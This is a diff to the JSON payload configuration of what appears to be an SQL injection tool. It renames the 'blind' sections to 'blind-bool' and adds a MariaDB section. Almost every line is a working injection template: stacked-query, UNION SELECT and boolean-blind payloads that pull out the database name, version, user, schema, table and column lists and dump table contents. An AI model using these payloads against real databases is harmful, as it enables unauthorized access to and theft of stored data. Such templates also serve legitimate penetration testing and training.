@@ -85,7 +85,7 @@
 					"columns": "+' UNION SELECT {offset_bef} CONCAT('{delimiter}', column_name, '{delimiter}') {offset_aft} FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}' LIMIT {limit} OFFSET {offset}-- -",
 					"dump": "+' UNION SELECT {offset_bef} CONCAT('{delimiter}', {column}, '{delimiter}') {offset_aft} FROM `{database}`.`{table}` LIMIT {limit} OFFSET {offset}-- -"
 				},
-				"blind": {
+				"blind-bool": {
 					"success_substring": "<div class=\"product-name\">",
 					"database": "' AND IF(SUBSTRING((SELECT DATABASE()),{position},1)='{char}',1,0)-- -",
 					"version": "' AND IF(SUBSTRING((SELECT VERSION()),{position},1)='{char}',1,0)-- -",
@@ -122,7 +122,7 @@
 					"columns": "+' UNION SELECT {offset_bef} CONCAT('{delimiter}', column_name, '{delimiter}') {offset_aft} FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}' LIMIT {limit} OFFSET {offset}-- -",
 					"dump": "+' UNION SELECT {offset_bef} CONCAT('{delimiter}', {column}, '{delimiter}') {offset_aft} FROM \"{database}\".\"{table}\" LIMIT {limit} OFFSET {offset}-- -"
 				},
-				"blind": {
+				"blind-bool": {
 					"success_substring": "<div class=\"product-name\">",
 					"database": "' AND CASE WHEN SUBSTRING((SELECT current_database()),{position},1)='{char}' THEN TRUE ELSE FALSE END-- -",
 					"version": "' AND CASE WHEN SUBSTRING((SELECT version()),{position},1)='{char}' THEN TRUE ELSE FALSE END-- -",
@@ -131,6 +131,44 @@
 					"tables": "' AND CASE WHEN SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='{database}' LIMIT 1 OFFSET {offset}),{position},1)='{char}' THEN TRUE ELSE FALSE END-- -",
 					"columns": "' AND CASE WHEN SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}' LIMIT 1 OFFSET {offset}),{position},1)='{char}' THEN TRUE ELSE FALSE END-- -",
 					"dump": "' AND CASE WHEN SUBSTRING((SELECT {column} FROM \"{database}\".\"{table}\" LIMIT 1 OFFSET {offset}),{position},1)='{char}' THEN TRUE ELSE FALSE END-- -"
+				}
+			},
+			"mariadb": {
+				"ignored_databases": [
+					"information_schema",
+					"mysql",
+					"performance_schema",
+					"sys"
+				],
+				"stacked": {
+					"database": "' AND 0; SELECT CONCAT('{delimiter}', DATABASE(), '{delimiter}') as name-- -",
+					"version": "' AND 0; SELECT CONCAT('{delimiter}', VERSION(), '{delimiter}') as name-- -",
+					"user": "' AND 0; SELECT CONCAT('{delimiter}', USER(), '{delimiter}') as name-- -",
+					"databases": "' AND 0; SELECT CONCAT('{delimiter}', schema_name, '{delimiter}') as name FROM information_schema.schemata-- -",
+					"tables": "' AND 0; SELECT CONCAT('{delimiter}', table_name, '{delimiter}') as name FROM information_schema.tables WHERE table_schema='{database}'-- -",
+					"columns": "' AND 0; SELECT CONCAT('{delimiter}', column_name, '{delimiter}') as name FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}'-- -",
+					"dump": "' AND 0; SELECT CONCAT('{delimiter}', {column}, '{delimiter}') as name FROM `{database}`.`{table}`-- -"
+				},
+				"union": {
+					"min_offset": 0,
+					"max_offset": 15,
+					"database": "+' UNION SELECT {offset_bef} CONCAT('{delimiter}', DATABASE(), '{delimiter}') {offset_aft}-- -",
+					"version": "+' UNION SELECT {offset_bef} CONCAT('{delimiter}', VERSION(), '{delimiter}') {offset_aft}-- -",
+					"user": "+' UNION SELECT {offset_bef} CONCAT('{delimiter}', USER(), '{delimiter}') {offset_aft}-- -",
+					"databases": "+' UNION SELECT {offset_bef} CONCAT('{delimiter}', schema_name, '{delimiter}') {offset_aft} FROM information_schema.schemata LIMIT {limit} OFFSET {offset}-- -",
+					"tables": "+' UNION SELECT {offset_bef} CONCAT('{delimiter}', table_name, '{delimiter}') {offset_aft} FROM information_schema.tables WHERE table_schema='{database}' LIMIT {limit} OFFSET {offset}-- -",
+					"columns": "+' UNION SELECT {offset_bef} CONCAT('{delimiter}', column_name, '{delimiter}') {offset_aft} FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}' LIMIT {limit} OFFSET {offset}-- -",
+					"dump": "+' UNION SELECT {offset_bef} CONCAT('{delimiter}', {column}, '{delimiter}') {offset_aft} FROM `{database}`.`{table}` LIMIT {limit} OFFSET {offset}-- -"
+				},
+				"blind-bool": {
+					"success_substring": "<div class=\"product-name\">",
+					"database": "' AND IF(SUBSTRING((SELECT DATABASE()),{position},1)='{char}',1,0)-- -",
+					"version": "' AND IF(SUBSTRING((SELECT VERSION()),{position},1)='{char}',1,0)-- -",
+					"user": "' AND IF(SUBSTRING((SELECT USER()),{position},1)='{char}',1,0)-- -",
+					"databases": "' AND IF(SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET {offset}),{position},1)='{char}',1,0)-- -",
+					"tables": "' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='{database}' LIMIT 1 OFFSET {offset}),{position},1)='{char}',1,0)-- -",
+					"columns": "' AND IF(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}' LIMIT 1 OFFSET {offset}),{position},1)='{char}',1,0)-- -",
+					"dump": "' AND IF(SUBSTRING((SELECT {column} FROM `{database}`.`{table}` LIMIT 1 OFFSET {offset}),{position},1)='{char}',1,0)-- -"
 				}
 			}
 		}
